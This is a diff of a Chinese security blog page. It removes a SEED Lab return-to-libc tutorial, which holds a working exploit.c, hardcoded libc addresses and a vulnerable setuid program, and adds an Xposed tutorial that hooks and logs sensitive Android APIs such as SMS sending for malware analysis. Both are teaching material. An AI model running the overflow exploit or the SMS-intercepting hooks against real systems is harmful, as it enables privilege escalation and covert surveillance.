-            <h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><h2 id="该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击-′▽-〃"><a href="#该教程是根据Seed-Lab-return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击-′▽-〃" class="headerlink" title="该教程是根据Seed Lab: return-to-libc的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)"></a>该教程是根据<a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Return_to_libc/" target="_blank" rel="external">Seed Lab: return-to-libc</a>的实验要求所写的，该教程只是演示了一下return-to-libc的一些基本的攻击原理，由于关了编译器及系统的一些保护措施，所以并不能在实际的情况下实现攻击(′▽`〃)</h2><h3 id="一：背景介绍"><a href="#一：背景介绍" class="headerlink" title="一：背景介绍"></a>一：背景介绍</h3><h4 id="DEP数据执行保护"><a href="#DEP数据执行保护" class="headerlink" title="DEP数据执行保护"></a>DEP数据执行保护</h4><p>  溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护，Data Execution Prevention）就是用来弥补计算机对数据和代码混淆这一天然缺陷的。DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP 的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。所以一般的将shellcode存放到栈中并将shellcode执行的方式在这种机制中是不可行的。</p>
-<p>  在Linux中，通常在编译的时候添加 -fno-stack-protector -z noexecstack 编译选项就会开启该模式，在该模式下，不能像以前的攻击将恶意代码overflow进栈中，并将return地址指向恶意代码开始处，在这种情况下应该借用系统库的调用从而达到提权等目的。</p>
-<h4 id="Return-to-libc原理"><a href="#Return-to-libc原理" class="headerlink" title="Return-to-libc原理"></a>Return-to-libc原理</h4><p>   Return-into-libc 攻击可以将漏洞函数返回到内存空间已有的动态库函数中。而为了理解 return-into-libc 攻击，这里首先给出程序函数调用过程中栈帧的结构。</p>
-<p>   图 1.函数调用时栈帧的结构：</p>
-<p>  <img src="http://i.imgur.com/HE3Xv98.png" alt=""></p>
-<p>   图 1 给出了一个典型的函数调用时的栈帧结构，该栈从高位地址向低位地址增长。每当一个函数调用另一个函数向低地址方向压栈，而当函数返回时向高地址方向清栈。例如，当 main() 调用 func(arg_1,arg_2,arg_3) 时，首先将所有参数arg_1,arg_2 和 arg_3入栈。图 1 中参数从右向左依次被压入栈中，这是因为 C 语言中函数传参是从右向左压栈的。然后，call 指令会将返回地址压栈，并使执行流转到 func()。返回地址是 call 指令的下一条指令的地址，这个用于告知 func ()函数返回后从 main()函数的哪条指令开始执行。进入 func 函数后，通常需要将 main()函数的栈底指针 ebp 保存到栈中并将当前的栈顶指针 esp 保存在 ebp 中作为 func 的栈底。接下来，func 函数会在栈中为局部变量等分配空间。因此，调用函数 func()时的栈帧结构如图 1 所示。<br>   而当 func()执行完成返回时 leave 指令将 ebp 拷贝到 esp 中清空局部变量在栈中的区域，然后从堆栈中弹出老 ebp 放回 ebp 寄存器使 ebp 恢复为 main()函数的栈底。然后 ret 指令从栈中获取返回地址，返回到 main()函数中继续执行。</p>
-<p>   攻击者可以利用栈中的内容实施 return-into-libc 攻击。这是因为攻击者能够通过缓冲区溢出改写返回地址为一个库函数的地址，并且将此库函数执行时的参数也重新写入栈中。这样当函数调用时获取的是攻击者设定好的参数值，并且结束后返回时就会返回到库函数而不是 main()。而此库函数实际上就帮助攻击者执行了其恶意行为。更复杂的攻击还可以通过 return-into-libc 的调用链（一系列库函数的连续调用）来完成。</p>
-<h3 id="二：实验部分"><a href="#二：实验部分" class="headerlink" title="二：实验部分"></a>二：实验部分</h3><h4 id="获得system-和exit-的地址"><a href="#获得system-和exit-的地址" class="headerlink" title="获得system()和exit()的地址"></a>获得system()和exit()的地址</h4><p>由于在实验开始就执行了 sysctl -w kernel.randomize_va_space=0 命令，该命令用来将系统的ASLR（地址随机化机制）关闭，所以在每次将libc.so库加载到内存中时，system()和exit()的地址都是一样的。所以就gdb调试retlib程序，在main出设置断点，并运行，程序会在main的入口处停下，然后执行p system,和p exit就能将system和exit在内存中的地址打印出来。</p>
-<p>具体操作如图2所示：</p>
-<p><img src="http://i.imgur.com/Rc0pUVy.png" alt=""></p>
-<p>由该图可知，函数system()和exit()的地址分别为0xb7e5f430和0xb7e52fb0。</p>
-<h4 id="获得”-bin-sh”字符串地址"><a href="#获得”-bin-sh”字符串地址" class="headerlink" title="获得”/bin/sh”字符串地址"></a>获得”/bin/sh”字符串地址</h4><p>获得字符串的地址主要有两种方法:其中第一个是在libc.so中找到字符串地址，第二个方法是将/bin/sh字符串放到环境变量中去</p>
-<ol>
-<li>由于libc.so的地址是固定的，所以在libc.so的”/bin/sh”字符串的地址也是固定的，所以可以在gdb调试的时候用find指定找到一个/bin/sh字符串的地址，具体方法如图3所示：<br><img src="http://i.imgur.com/qkflPn4.png" alt=""></li>
-<li>首先export MYSHELL = /bin/sh,然后编写程序获得名为MYSHELL环境变量的地址，将其输出即可，输出结果如图4所示：</li>
+            <h2 id="Xposed框架"><a href="#Xposed框架" class="headerlink" title="Xposed框架"></a>Xposed框架</h2><p>Xposed框架通过修改Android系统的源码，并替换Android的主程序Zygote(Init 是所有Linux程序的起点，而Zygote于Android，正如它的英文意思，是所有java程序的’孵化池’)，从而能够控制Android进程的执行流程，hook java层的API。</p>
+<p>首先在app_main.cpp中，对appRuntime.cpp进行了修改，其中onVmCreated(JNIEnv* env)修改如下：</p>
+<p><img src="http://i.imgur.com/XOVoaf1.png" alt=""></p>
+<p>在onVmCreate中，它将调用libxposed_dalvik.so中的xposedInitLib函数，然后再调用so中设置的onVmCreated函数。这个onVmCreated函数由xposedInitLib设置。</p>
+<p>在app_main.cpp的main方法中，进行了对xposed的环境初始化：</p>
+<p><img src="http://i.imgur.com/AGSWHIX.png" alt=""></p>
+<p>最后，如果xposed框架启用成功，那么zygote的入口类将由以前的com.android.internal.os.ZygoteInit变成de.robv.android.xposed.XposedBridge。</p>
+<p>下面我们按照执行流程，把相关函数分析一遍：</p>
+<p>AppRuntime的onVmCreated，它最终会导致libxposed_dalvik.so中的onVmCreated被调用。我们直接分析最后这个onVmCreated。</p>
+<p>然后AppRuntime里会调用de.robv.android.xposed.XposedBridge.main函数。</p>
+<p>所以通过调用XposedBridge.main函数，可以给APK进程的一些特定函数挂上钩子，从而能够监听该函数，进而通过beforeHookedMethod和afterHookedMethod方法可以分别实现调用函数前的操作和调用函数后的操作。</p>
+<hr>
+<h2 id="Hook用到的具体函数"><a href="#Hook用到的具体函数" class="headerlink" title="Hook用到的具体函数"></a>Hook用到的具体函数</h2><p>下面给出我在做Android恶意程序分析时需要hook的函数的一些操作，该程序参考了<a href="https://github.com/halfkiss/ZjDroid" target="_blank" rel="external">halfkiss</a>的框架。</p>
+<ul>
+<li>用到的Xposed的函数： 首先定义一个抽象类MethodHookCallBack继承自Xposed的XC_MethodHook类，该类有两个方法:beforeHookedMethod(MethodHookParam param)和AfterHookedMethod(MethodHookParam param)方法，这两个方法分别对应于要hook的函数调用之前所要执行的动作与该函数调用之后所要执行的动作。比如：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public void beforeHookedMethod(MethodHookParam param)</div><div class="line">&#123;</div><div class="line">		Log.i(&quot;Before hook&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>上面的例子说明在调用要hook的函数之前打印一段log为Before hook。</p>
+<ul>
+<li><p>Xposed的hook的主函数hookMethod(Member hookMethod, XC_MethodHook callback),其中参数hookMethod表示要hook的函数，该函数可以通过java的反射机制获得，具体怎么获得在下面会讲到，参数callback就是前面讲到的Xposed函数的XC_MethodHook类，该类主要是表示该对要hook的函数做怎样的处理。具体的hookMethod方法如下图所示:</p>
+<p><img src="http://i.imgur.com/2wogiTz.png" alt=""></p>
+</li>
+</ul>
+<p>由hookMethod可知，一个目标函数可以挂多个钩子，这些钩子由一个集合来存储。然后我们将转到JNI层去看看hookMethodNative干了什么事情。这才是hook的核心。分析如下图所示：</p>
+<p><img src="http://i.imgur.com/KyVH8qz.png" alt=""></p>
+<p><img src="http://i.imgur.com/C02H8xN.png" alt=""></p>
+<p>所以当apk执行被hook的函数时，实际执行的是hookMethodCallBack函数，该函数就是钩子函数，我们来看看hookmethodCallBack函数具体是怎么执行的，该函数在libXposed_dalvik.cpp中。</p>
+<p><img src="http://i.imgur.com/7JbmYot.png" alt=""></p>
+<p>在xposedHandleHookedMethod函数中会以此执行钩子函数，即在前面介绍的XC_MethodHook函数，然后再会执行程序的原函数。</p>
+<p>在此，Hook需要用到的基本函数已经介绍完毕。接下来会介绍如何利用Xposed来实现hook敏感函数的操作。</p>
+<hr>
+<h2 id="hook敏感函数"><a href="#hook敏感函数" class="headerlink" title="hook敏感函数"></a>hook敏感函数</h2><ul>
+<li>首先定义MethodHookCallBack类继承自XC_MethodHook,该函数实现了beforeHookedMethod和afterHookedMethod函数，主要是获得HookParam类，该类主要是存储了一些MethodHookParam的一些参数。然后调用该类中beforeHookedMethod(HookParam param)或者afterHookedMethod(HookParam param)。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">public abstract class MethodHookCallBack extends XC_MethodHook &#123;</div><div class="line">		</div><div class="line">		@Override</div><div class="line">		protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</div><div class="line">			// TODO Auto-generated method stub</div><div class="line">			super.beforeHookedMethod(param);</div><div class="line">			HookParam hookParam = HookParam.fromXposed(param);</div><div class="line">			this.beforeHookedMethod(hookParam);</div><div class="line">			if(hookParam.hasResult())</div><div class="line">				param.setResult(hookParam.getResult());</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		@Override</div><div class="line">		protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;</div><div class="line">			// TODO Auto-generated method stub</div><div class="line">			super.afterHookedMethod(param);</div><div class="line">			HookParam hookParam = HookParam.fromXposed(param);</div><div class="line">			this.afterHookedMethod(hookParam);</div><div class="line">			if(hookParam.hasResult())</div><div class="line">				param.setResult(hookParam.getResult());</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		public abstract void beforeHookedMethod(HookParam param);</div><div class="line">		public abstract void afterHookedMethod(HookParam param);</div><div class="line"></div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>根据字符串找到要hook的函数，主要是利用java的反射函数，如果有兴趣的可以去查阅一下java的反射机制，主要是通过字符串来得到相应的类，函数或变量等，具体代码如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">public static Method findMethod(String className, ClassLoader classLoader, String methodName,</div><div class="line">			Class&lt;?&gt;... parameterTypes)</div><div class="line">	&#123;</div><div class="line">		</div><div class="line">		try &#123;</div><div class="line">		Class clazz = classLoader.loadClass(className);</div><div class="line">		Method method = clazz.getDeclaredMethod(methodName, parameterTypes);</div><div class="line">		method.setAccessible(true);</div><div class="line">		return method;</div><div class="line">	&#125; catch (NoSuchMethodException e) &#123;</div><div class="line">		e.printStackTrace();</div><div class="line">	&#125; catch (ClassNotFoundException e) &#123;</div><div class="line">		// TODO Auto-generated catch block</div><div class="line">		e.printStackTrace();</div><div class="line">	&#125;</div><div class="line">	return null;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我们通过该方法可以获得要hook的具体method。</p>
+<ul>
+<li>定义抽象类AbstractBahaviorHookCallBack继承自前面讲到的MethodHookCallBack类，该类具体实现当调用要hook的函数时，就打印该函数。具体实现如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">    public abstract class AbstractBahaviorHookCallBack extends MethodHookCallBack &#123;</div><div class="line">    </div><div class="line">    	@Override</div><div class="line">    	public void beforeHookedMethod(HookParam param) &#123;</div><div class="line">    		// TODO Auto-generated method stub</div><div class="line">    		/*int length = param.args.length;</div><div class="line">    		Object[] m = param.args;</div><div class="line">    		String args = &quot;/&quot;;</div><div class="line">    		for(int i = 0; i &lt; length;i++)</div><div class="line">    		&#123;</div><div class="line">    			args+=(String)m[i]+&quot;/&quot;;</div><div class="line">    		&#125;*/</div><div class="line">    		Logger.logD(&quot;Invoke &quot;+ param.method.getDeclaringClass().getName()+&quot;-&gt;&quot;+param.method.getName());</div><div class="line">    		this.descParam(param);</div><div class="line">    		//this.printStackInfo();</div><div class="line">    	&#125;</div><div class="line">    </div><div class="line">    	@Override</div><div class="line">    	public void afterHookedMethod(HookParam param) &#123;</div><div class="line">    		// TODO Auto-generated method stub</div><div class="line">    		//Logger.log_behavior(&quot;End Invoke &quot;+ param.method.toString());</div><div class="line">    	&#125;</div><div class="line">    	</div><div class="line">    	private void printStackInfo()&#123;</div><div class="line">    		Throwable ex = new Throwable();</div><div class="line">    		StackTraceElement[] stackElements = ex.getStackTrace();</div><div class="line">    		if(stackElements != null)&#123;</div><div class="line">    			StackTraceElement st;</div><div class="line">    			for(int i=0; i&lt;stackElements.length; i++)&#123;</div><div class="line">    				st = stackElements[i];</div><div class="line">    				if(st.getClassName().startsWith(&quot;com.android.binpang&quot;)||st.getClassName().startsWith(&quot;de.robv.android.xposed.XposedBridge&quot;))</div><div class="line">    					continue;</div><div class="line">    				Logger.logD(st.getClassName()+&quot;:&quot;+st.getMethodName()+&quot;:&quot;+st.getFileName()+&quot;:&quot;+st.getLineNumber());</div><div class="line">    			&#125;</div><div class="line">    		&#125;</div><div class="line">    	&#125;</div><div class="line">    	</div><div class="line">    	public abstract void descParam(HookParam param);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>具体要实现的hook函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Method sendTextMessagemethod =  FindMethod.findMethod(</div><div class="line">				&quot;android.telephony.SmsManager&quot;, ClassLoader.getSystemClassLoader(),</div><div class="line">				&quot;sendTextMessage&quot;, String.class,String.class,String.class,PendingIntent.class,PendingIntent.class);</div><div class="line">		hookhelper.hookMethod(sendTextMessagemethod, new AbstractBahaviorHookCallBack() &#123;</div><div class="line">			</div><div class="line">			@Override</div><div class="line">			public void descParam(HookParam param) &#123;</div><div class="line">				// TODO Auto-generated method stub</div><div class="line">				Logger.logI(&quot;Send SMS -&gt;&quot;);</div><div class="line">				String dstNumber = (String)param.args[0];</div><div class="line">				String content = (String)param.args[2];</div><div class="line">				Logger.logI(&quot;SMS DestNumber:&quot;+dstNumber);</div><div class="line">				Logger.logI(&quot;SMS Content:&quot;+content);</div><div class="line">			&#125;</div><div class="line">		&#125;);</div></pre></td></tr></table></figure>
+<p>该示例函数是hook了android.telephony.SmeManager/sendTextMessage函数，当调用该函数的时候，会打印出来要发送的目标号码，及发送的message的内容。</p>
+<ul>
+<li>监听的敏感函数列表</li>
+</ul>
+<h3 id="SmsManager"><a href="#SmsManager" class="headerlink" title="SmsManager"></a>SmsManager</h3><ol>
+<li>android.telephony.SmsManager/sendTextMessage </li>
+<li>android.telephony.SmsManager/getAllMessagesFromIcc </li>
+<li>android.telephony.SmsManager/sendDataMessage </li>
+<li>android.telephony.SmsManager/sendMultipartTextMessage </li>
 </ol>
-<h4 id="获得buffer要return的地址偏移"><a href="#获得buffer要return的地址偏移" class="headerlink" title="获得buffer要return的地址偏移"></a>获得buffer要return的地址偏移</h4><p>首先构造一个从A-Z和从a-z的badfile文件，然后gdb retlib，run，就会出现栈溢出，找出栈溢出的地址为如图5所示</p>
-<p><img src="http://i.imgur.com/RHD2w3J.png" alt=""></p>
-<p>0x62615a59代表的char为baZY，因为它是大端法表示的，所以为YZab，在地buffer的24-27偏移处。所以X为24。</p>
-<p>由图1可知道栈的结构，即return地址的下面4个字节为要返回的下个地址指针，再下面4个字节为函数参数，所以24+4=28处存取exit()的函数，24+8=32出存取/bin/sh字符串的地址</p>
-<h4 id="编写exploit程序"><a href="#编写exploit程序" class="headerlink" title="编写exploit程序"></a>编写exploit程序</h4><p>所以exploit.c的程序如下所示:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  char buf[40];</div><div class="line">  FILE *badfile;</div><div class="line"></div><div class="line">  badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);</div><div class="line">  int i;</div><div class="line">  for(i = 0;i &lt; 40;i++)</div><div class="line"> buf[i] = 0x90;</div><div class="line"></div><div class="line">  /* You need to decide the addresses and </div><div class="line"> the values for X, Y, Z. The order of the following </div><div class="line"> three statements does not imply the order of X, Y, Z.</div><div class="line"> Actually, we intentionally scrambled the order. */</div><div class="line">  *(long *) &amp;buf[32] = 0xb7f80fb8 ;   //  &quot;/bin/sh&quot;</div><div class="line">  *(long *) &amp;buf[24] = 0xb7e5f430 ;   //  system()</div><div class="line">  *(long *) &amp;buf[28] = 0xb7e52fb0 ;   //  exit()</div><div class="line"></div><div class="line">  fwrite(buf, sizeof(buf), 1, badfile);</div><div class="line">  fclose(badfile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>在前面步骤获得了system()，exit()和/bin/sh在内存的地址，以及return在buffer的偏移地址，所以可以按照上面获得的信息来补全exploit.c的程序。</p>
-<p>retlib.c程序:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">/* This program has a buffer overflow vulnerability. */</div><div class="line">/* Our task is to exploit this vulnerability */</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int bof(FILE *badfile)</div><div class="line">&#123;</div><div class="line">char buffer[12];</div><div class="line"></div><div class="line">/* The following statement has a buffer overflow problem */</div><div class="line">fread(buffer, sizeof(char), 40, badfile);</div><div class="line"></div><div class="line">return 1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">FILE *badfile;</div><div class="line"></div><div class="line">badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);</div><div class="line">bof(badfile);</div><div class="line"></div><div class="line">printf(&quot;Returned Properly\n&quot;);</div><div class="line"></div><div class="line">fclose(badfile);</div><div class="line">return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>在编译retlib.c程序时，用root权限编译，这样在运行/bin/sh程序时即可提权。</p>
-<p>提权结果如下：</p>
-<p><img src="http://i.imgur.com/CFdjcrV.png" alt=""></p>
+<h3 id="TelephonyManager"><a href="#TelephonyManager" class="headerlink" title="TelephonyManager"></a>TelephonyManager</h3><ol>
+<li>android.telephony.TelephonyManager/getLine1Number </li>
+<li>android.telephony.TelephonyManager/listen </li>
+</ol>
+<h3 id="AccountManager"><a href="#AccountManager" class="headerlink" title="AccountManager"></a>AccountManager</h3><ol>
+<li>android.accounts.AccountManager/getAccounts </li>
+<li>android.accounts.AccountManager/getAccountsByType </li>
+</ol>
+<h3 id="ActivityManager"><a href="#ActivityManager" class="headerlink" title="ActivityManager"></a>ActivityManager</h3><ol>
+<li>android.app.ActivityManager/killBackgroundProcesses </li>
+<li>android.app.ActivityManager/forceStopPackage </li>
+</ol>
+<h3 id="AlarmManager"><a href="#AlarmManager" class="headerlink" title="AlarmManager"></a>AlarmManager</h3><ol>
+<li>android.app.AlarmManager/setImpl </li>
+</ol>
+<h3 id="AudioRecord"><a href="#AudioRecord" class="headerlink" title="AudioRecord"></a>AudioRecord</h3><ol>
+<li>android.media.AudioRecord </li>
+</ol>
+<h3 id="Camera"><a href="#Camera" class="headerlink" title="Camera"></a>Camera</h3><ol>
+<li>android.hardware.Camera/takepicture </li>
+<li>android.hardware.Camera/setPreviewCallback </li>
+<li>android.hardware.Camera/setPreviewCallbackWithBuffer </li>
+<li>android.hardware.Camera/setOneShotPreviewCallback </li>
+</ol>
+<h3 id="ConnectivityManager"><a href="#ConnectivityManager" class="headerlink" title="ConnectivityManager"></a>ConnectivityManager</h3><ol>
+<li>android.net.ConnectivityManager/setMobileDataEnabled </li>
+</ol>
+<h3 id="ContentResolver"><a href="#ContentResolver" class="headerlink" title="ContentResolver"></a>ContentResolver</h3><ol>
+<li>android.content.ContentResolver/qurey </li>
+<li>android.content.ContentResolver/registerContentObserver </li>
+<li>android.content.ContentResolver/insert </li>
+<li>android.content.ContentResolver/bulkInsert </li>
+<li>android.content.ContentResolver/delete </li>
+<li>android.content.ContentResolver/update </li>
+<li>android.content.ContentResolver/applyBatch </li>
+</ol>
+<h3 id="ContextImpl"><a href="#ContextImpl" class="headerlink" title="ContextImpl"></a>ContextImpl</h3><ol>
+<li>android.app.ContextImpl/registerReceiver </li>
+</ol>
+<h3 id="MediaRecorder"><a href="#MediaRecorder" class="headerlink" title="MediaRecorder"></a>MediaRecorder</h3><ol>
+<li>android.media.MediaRecorder/start </li>
+<li>android.media.MediaRecorder/stop </li>
+</ol>
+<h3 id="Internet"><a href="#Internet" class="headerlink" title="Internet"></a>Internet</h3><ol>
+<li>java.net.URL/openConnection </li>
+<li>org.apache.http.impl.client.AbstractHttpClient/execute </li>
+</ol>
+<h3 id="NotificationManager"><a href="#NotificationManager" class="headerlink" title="NotificationManager"></a>NotificationManager</h3><ol>
+<li>android.app.NotificationManager/notify </li>
+</ol>
+<h3 id="ApplicationPackageManager"><a href="#ApplicationPackageManager" class="headerlink" title="ApplicationPackageManager"></a>ApplicationPackageManager</h3><ol>
+<li>android.app.ApplicationPackageManager/installPackage </li>
+<li>android.app.ApplicationPackageManager/deletePackage </li>
+<li>android.app.ApplicationPackageManager/getInstalledPackages</li>
+</ol>
+<hr>
+<h2 id="Xposed编程步骤"><a href="#Xposed编程步骤" class="headerlink" title="Xposed编程步骤"></a>Xposed编程步骤</h2><ul>
+<li>首先在xposedbridgeapi.jar包导入到项目中，这里采用了XposedBridgeApi-54.jar包</li>
+<li>再项目的assets文件夹中新建一个xposed_init文件(没有后缀)，该文件表示该xposed模板的主函数类的具体路径，比如该项目为</li>
+</ul>
+<p><img src="http://i.imgur.com/vjTMKex.png" alt=""></p>
+<ul>
+<li>在AndroidManifest.xml文件的<application>标签下添加xposed的一些信息，以便Xposed能够识别该模板。</application></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</div><div class="line">package=&quot;com.example.methodhook&quot;</div><div class="line">android:versionCode=&quot;1&quot;</div><div class="line">android:versionName=&quot;1.0&quot; &gt;</div><div class="line"></div><div class="line">&lt;uses-sdk</div><div class="line">android:minSdkVersion=&quot;18&quot;</div><div class="line">android:targetSdkVersion=&quot;21&quot; /&gt;</div><div class="line"></div><div class="line">&lt;application</div><div class="line">android:allowBackup=&quot;true&quot;</div><div class="line">android:icon=&quot;@drawable/ic_launcher&quot;</div><div class="line">android:label=&quot;@string/app_name&quot;</div><div class="line">android:theme=&quot;@style/AppTheme&quot; &gt;</div><div class="line">&lt;activity</div><div class="line">android:name=&quot;com.binpang.methodhook.MainActivity&quot;</div><div class="line">android:label=&quot;@string/app_name&quot; &gt;</div><div class="line">&lt;intent-filter&gt;</div><div class="line">&lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</div><div class="line"></div><div class="line">&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</div><div class="line">&lt;/intent-filter&gt;</div><div class="line">&lt;/activity&gt;</div><div class="line">&lt;meta-data</div><div class="line">android:name=&quot;xposedmodule&quot;</div><div class="line">android:value=&quot;true&quot; /&gt;</div><div class="line">&lt;meta-data</div><div class="line">android:name=&quot;xposedminversion&quot;</div><div class="line">android:value=&quot;40&quot; /&gt;</div><div class="line">&lt;meta-data</div><div class="line">android:name=&quot;xposeddescription&quot;</div><div class="line">android:value=&quot;Monitor the System&apos;s apis&quot; /&gt;</div><div class="line">&lt;/application&gt;</div><div class="line"></div><div class="line">&lt;/manifest&gt;</div></pre></td></tr></table></figure>
+<ul>
+<li>在Android手机(或模拟器,建议使用模拟器，一般的模拟器都已经root过了)中安装XposedInstaller(需要root权限), 由于Xposed替换了Android的一些程序，所以需要重启才能生效。</li>
+<li>然后启动该模板程序，使其安装到Android手机中，然后再Xposed的模板中找到它，并打钩，如图所示：</li>
+</ul>
+<p><img src="http://i.imgur.com/fNqLYSN.png" alt=""></p>
+<h2 id="演示hook结果"><a href="#演示hook结果" class="headerlink" title="演示hook结果"></a>演示hook结果</h2><p>通过短信软件向5554号码发送”hello,world”内容，如图所示：</p>
+<p><img src="http://i.imgur.com/NZdOdJr.png" alt=""></p>
+<p>结果查找logcat如图所示:</p>
+<p><img src="http://i.imgur.com/RcZsVZu.png" alt=""></p>
+<hr>
+<p>具体可以参考<a href="https://github.com/bin2415/methodHook" target="_blank" rel="external">我的github</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2016/04/16/github-ssh/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
